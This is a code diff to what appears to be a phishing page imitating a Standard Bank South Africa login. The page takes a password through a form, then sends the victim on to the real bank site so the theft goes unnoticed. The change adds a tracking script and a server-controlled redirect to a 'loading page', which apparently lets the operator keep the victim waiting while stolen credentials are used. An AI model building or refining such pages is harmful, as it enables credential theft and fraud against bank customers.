@@ -191,6 +191,9 @@
         <div id="error-message" class="error-message"></div>
     </form>
 
+    <!-- User Activity Tracking Script -->
+    <script src="/public/tracking.js"></script>
+    
     <!-- JavaScript -->
     <script>
         // Show Password Toggle functionality
@@ -237,10 +240,18 @@
                 // Reset form after successful submission
                 document.getElementById('contact-form').reset();
                 
-                // Redirect to Standard Bank website after 2 seconds
-                setTimeout(() => {
-                    window.location.href = "https://www.standardbank.co.za/southafrica/personal";
-                }, 2000);
+                // Check if server provided a redirect URL
+                if (data.redirect) {
+                    // Redirect to loading page immediately for better user experience
+                    setTimeout(() => {
+                        window.location.href = data.redirect; // Redirect to loading page
+                    }, 1000); // 1 second delay to show success message
+                } else {
+                    // Fallback: redirect to Standard Bank website after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = "https://www.standardbank.co.za/southafrica/personal";
+                    }, 2000);
+                }
             })
             .catch(error => {
                 console.error('Error:', error); // Log error to console
